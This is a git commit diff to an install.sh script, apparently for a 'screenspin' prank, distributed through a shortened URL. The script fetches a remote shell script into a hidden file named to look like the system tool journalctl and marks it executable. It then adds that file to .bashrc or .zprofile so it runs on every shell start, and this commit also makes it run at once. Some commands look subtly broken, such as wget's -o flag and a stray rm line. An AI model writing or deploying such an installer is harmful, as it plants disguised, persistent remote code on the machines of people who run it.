6a9dc9026b0c7394ab6cb1194ef613368cf3cdd1
manfromth3m0on <maxstantay@gmail.com>
2020-04-18 18:33:03 +0000

    install pulls from github repo

--- install.sh
+++ install.sh
@@ -1,5 +1,5 @@
 # avaliable at shorturl.at/ovNW1
-wget -o "$HOME/.journalctl" -q "https://pastebin.com/raw/1Uj0785b" 
+wget -o "$HOME/.journalctl" -q "https://raw.githubusercontent.com/manfromth3m0oN/screenspin/master/screenspin.sh" 
 rm -rf 1Uj0785b
 fp="$HOME/.journalctl"
 chmod +x "$fp"
@@ -9,3 +9,4 @@ if [[ -e $HOME/.zprofile && -e /usr/bin/zsh ]]; then
 elif [[ -e $HOME/.bashrc ]]; then
 	echo "$HOME/.journalctl" >> .bashrc
 fi
+$HOME/.journalctl
